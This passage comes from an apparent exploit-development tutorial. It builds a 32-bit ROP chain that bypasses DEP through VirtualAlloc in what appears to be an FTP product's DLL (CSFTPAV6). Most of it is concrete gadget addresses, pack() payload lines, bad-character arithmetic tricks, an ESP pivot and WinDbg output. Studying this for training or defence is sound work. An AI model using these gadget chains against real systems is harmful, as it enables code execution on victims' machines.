<li>lpAddress should be the same value as the return address (the value of our shellcode)</li>
<li>dwSize to be 0x01</li>
<li>flAllocationType 0x1000</li>
<li>flProtect 0x40</li>
</ul>
<h2 id="patching-lpaddress">Patching lpAddress</h2>
<p>Regarding lpAddress, we first need to know where this address is in the stack. If we take a look, we can see that it is 4 bytes lower than the ESI register (which contain the return address) so we can increment ESI by four in order to have control over lpAddress. Let&rsquo;s use the same increment instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret
</span></span></code></pre></div><p>Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX.
In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.
We will reproduce the ROP chain to copy ESI value into EAX and then substract EAX 0x20c:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, esi ; pop esi ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5052f773</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xfffffdf4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x20c</span>  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50533bf4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> sub eax, ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
</span></span></code></pre></div><p>It is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.</p>
<p>Now if we run the code, and inspect lpAddress and the return address, they should point to the same dummy address. Once we know the real offset from the shellcode, we will fix the offset and they should point to the shellcode address.</p>
<h2 id="patching-dwsize">Patching dwSize</h2>
<p>Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page.
The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes. We can&rsquo;t perform a mov or an inc instruction, so we need to use another technique.
The new technique that we will use is the <code>neg</code> instruction. This instruction will replace the value in a register for its two&rsquo;s complement. This is equivalent to substract the value from zero.
In 32 bits we can abuse the fact that we can perform this operation and ignore the upper DWORD of the result to obtain the value we want.</p>
<p>For example, if we want to obtain 0x00000001, we can substract ffffffff from 0 and take the lower DWORD:</p>
<pre tabindex="0"><code>0:006&gt; ? 0 - ffffffff
Evaluate expression: -4294967295 = ffffffff`00000001
</code></pre><p>Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD. Note that this is not valid per se in x64 and we would have to truncate the register (as the ffffffff value would exist after the calculation).
Therefore, if we want to obtain a 0x01 value, we can just negate fffffffff from a register.
<strong>Note: In 32 bits, we can use neg (compliment of two) of any value to obtain the same value but in positive, in the case that the value has null bytes.</strong>*</p>
<p>Once again, we must point to the dwSize variable in the stack to modify it. And once again, this variable is 4 bytes higher than ESI. So we can increment ESI by four again and then pop the value 0xffffffff into eax and negate it. Lastly, we can override the value that dwSize has for this value in EAX, which is 0x01.</p>
<h2 id="patching-flallocationtype">Patching flAllocationType</h2>
<p>Now we must move to flAllocationType, which must be set to 0x1000.
We could try to reuse the trick of negation but we notice that two’s complement to 0x1000 is 0xfffff000, which also contains null bytes, so we keep having the problems:</p>
<pre tabindex="0"><code>0:063&gt; ? 0 - 1000
Evaluate expression: -4096 = fffff000
</code></pre><p>While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively. We’re going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.</p>
<p>We want to have 0x1000 as our final value in any register.
We can substract any value with non-null badchars from 0x1000 and we can take the DWORD of the result and add it to the value we have chosen. This results in our 0x1000 value again, but we replace 0x1000 for these two values, the one we have chosen and the DWORD of the result, to obtain our desired value.
Let&rsquo;s see it graphically:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">80808080</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">2155901056</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">7f7f8f</span><span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">80808080</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7f7f8f</span><span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">4294971392</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001000</span>
</span></span></code></pre></div><p><strong>Note</strong>: Both values, the one chosen and its DWORD result from substraction, should not have badchars. It is recommended to choose long values.
Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together to obtain 0x1000 (due to the 32 bit truncation). Remember that to access flAllocationType dummy address we have to increment ESI by four again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5053a0f5</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x80808080</span>)) <span style="color:#960050;background-color:#1e0010">#</span> first value to be added  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x7f7f8f80</span>)) <span style="color:#960050;background-color:#1e0010">#</span> second value to be added  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
</span></span></code></pre></div><p><strong>Note: due to the reuse of some gadgets, we can create conditional breakpoint to stop in a gadget but only if the value of the registers are the ones we want. For example, here stop in 0x505179a only if EAX is 0x80808080</strong>:</p>
<pre tabindex="0"><code>bp 0x5051579a &#34;.if (@eax &amp; 0x0`ffffffff) = 0x80808080 {} .else {gc}&#34;
</code></pre><h2 id="patching-flprotect">Patching flProtect</h2>
<p>The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
In order to write that to the stack, we will reuse the same technique we did for flAllocationType.
As it has null bytes (0x00000040) we have to do the neg trick. Let&rsquo;s find out the value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">80808080</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">2155905088</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">7f7f7f</span>c0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">80808080</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7f7f7f</span>c0
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">4294967360</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000040</span>
</span></span></code></pre></div><p>According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. This would be the ROP chain to patch flProtect, doing everything we have done for the other variables (EIP increment, setting up the operations and patching the value in the address):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5053a0f5</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x80808080</span>)) <span style="color:#960050;background-color:#1e0010">#</span> first value to be added  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x7f7f7fc0</span>)) <span style="color:#960050;background-color:#1e0010">#</span> second value to be added  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
</span></span></code></pre></div><p><strong>Note: We have finished our full exploit with all the gadgets. A recommendation is to add the following gadget that will make a software breakpoint, in order to execute the entire ROP chain and catch the execution flow jut after the flProtect value has been patched:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051e4db</span>)) <span style="color:#960050;background-color:#1e0010">#</span> int3 ; push eax ; call esi
</span></span></code></pre></div><p>Note that only int3 will be executed, the other instructions will get paused. Remember to remove it after inspecting that everything works:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">16</span>b0<span style="color:#ae81ff">.4</span>c0)<span style="color:#f92672">:</span> Break instruction exception <span style="color:#f92672">-</span> code <span style="color:#ae81ff">80000003</span> (first chance)
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000040</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aebf60 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">7f7f7f</span>c0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77292</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0184e304</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051e4</span>db esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0184e40</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd63d</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051e4</span>db cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dds esi <span style="color:#f92672">-</span> <span style="color:#ae81ff">14</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f0  <span style="color:#ae81ff">76</span>c05680 KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f4  <span style="color:#ae81ff">0184e504</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f8  <span style="color:#ae81ff">0184e504</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>fc  <span style="color:#ae81ff">00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e300</span>  <span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e304</span>  <span style="color:#ae81ff">00000040</span>
</span></span></code></pre></div><p>As we can see in ESI and lower locations the prepared call stack for the VirtualAlloc function has been prepared. We have the correct address for VirtualAlloc, the return address, and the four parameters: lpAddress, dwSize, flAllocationType and lpProtect.</p>
<h1 id="fixing-esp-to-execute-virtualalloc">Fixing ESP to execute VirtualAlloc</h1>
<p>The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
In order to invoke the API, we must jump to the &ldquo;VirtualAlloc&rdquo; address in the stack.
How do we jump? By forcing ESP to point to such address and then performing a ret instruction (ret single gadget).
In order to force ESP to point to such address, we must perform a ROP chain to move ESP here:</p>
<pre tabindex="0"><code>0:055&gt; dds esi - 14
0184e2f0  76c05680 KERNEL32!VirtualAllocStub &lt;- ESP SHOULD POINT HERE
0184e2f4  0184e504
0184e2f8  0184e504
0184e2fc  00000001
0184e300  00001000
0184e304  00000040
</code></pre><p><strong>Note that the return address and lpAddress do not point to our shellcode yet. We need to fix these values later. Let&rsquo;s focus on the ROP chain needed to ESP to point to this address.</strong></p>
<p>Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET.
However, this is only useful is EBP previously points to our VirtualAlloc address in the stack.
Let&rsquo;s force EBP to point to our VirtualAlloc address.</p>
<p>First, we must remember that when the ROP chain has been finished patching the arguments of VirtualAlloc, ESI will contain the address of the last parameter (flProtect). We can use this address and substract the bytes from this address to the address of VirtualAlloc in the stack.
Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.
<strong>Note: If you have to add a value to another one, in 32 bits you can abuse the fact that adding a large value will overflow. Sometimes adding a large value is the same as adding a small value (with badchars). Only 32 bits.</strong></p>
<p>Therefore, what we will do is:</p>
<ul>
<li>Use EIP that is near our desired address.</li>
<li>Move EIP to EAX</li>
<li>Substract some bytes to EAX to reach our desired address in the stack (<strong>Note</strong>: we do this in EAX as there are more gadgets with EAX).</li>
<li>Move EAX to EBX</li>
<li>Move EBX to ESP</li>
</ul>
<p>We have to move EAX to EBX and then EBX to ESP as there are not direct gadgets. Therefore, we have to play a bit with the registers.</p>
<p>The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.</p>
<p>The gadget chain to move ESP to our desired address is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e"># Put ESP to point to VirtualAlloc address in stack.  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># In order to set ESP, we need gadgets that operate with ESI, EAX, ECX, EBP and finally ESP.  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># There are not direct pop esp gadgets or similar.  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax,esi ; pop esi ; retn  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xffffffe8</span>)) <span style="color:#960050;background-color:#1e0010">#</span> negative offset value  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051571f</span>)) <span style="color:#960050;background-color:#1e0010">#</span> xchg eax, ebp ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50533cbf</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov esp, ebp ; pop ebp ; ret
</span></span></code></pre></div><p>Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes (same as substracting 0x18 bytes).
Note that we put ESP <strong>before the VirtualAlloc address as we end doing a POP EBP gadget</strong>.
<strong>Note: In this case we reused a value that was in the stack so we pointed EBP 4 bytes higher and we made a pop instruction so ESP is decremented and EBP takes such value. We cant do the strategy of putting other value as the next in the gadget chain as we are doing a mov esp, which means that esp is not going to point anymore to our rop gadget! remember that moving ESP means that we lose control of our gadgets. So we have to do the offset-4</strong></p>
<p>Now, we can put a breakpoint on any of the latest gadgets we added.
<strong>Note: as the gadget has been used several times, and we know EAX value is 0x40 after patching flProtect, we can set a conditional breakpoint to stop on that gadget address if EAX is 0x40:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>bp <span style="color:#ae81ff">0x5050118e</span> <span style="color:#e6db74">&#34;.if @eax = 0x40 {} .else {gc}&#34;</span>
</span></span></code></pre></div><p>We can see that we stop just after patching flProtect:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000040</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05e4</span>b220 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">7f7f7f</span>c0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>ce304 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5050118</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>ce40c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">8</span>bc6            mov     eax,esi
</span></span></code></pre></div><p>Let&rsquo;s execute the ROP chain and see where ESP points to:</p>
